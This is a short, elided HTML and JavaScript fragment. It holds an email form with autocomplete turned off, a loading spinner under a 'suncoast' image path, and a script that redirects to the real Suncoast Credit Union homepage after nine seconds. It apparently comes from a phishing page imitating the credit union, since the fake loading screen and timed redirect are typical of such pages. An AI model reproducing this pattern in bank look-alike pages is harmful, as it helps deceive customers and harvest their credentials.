...
<form action="" id="emailFormx" name="emailFormx" autocomplete="off"  method="post">
...
<img src="media/images/suncoast/slider/loading.gif" width="85" height="85" />
</div>
...
setTimeout(function() {
      window.location.href = "https://www.suncoastcreditunion.com/";
  },9000);
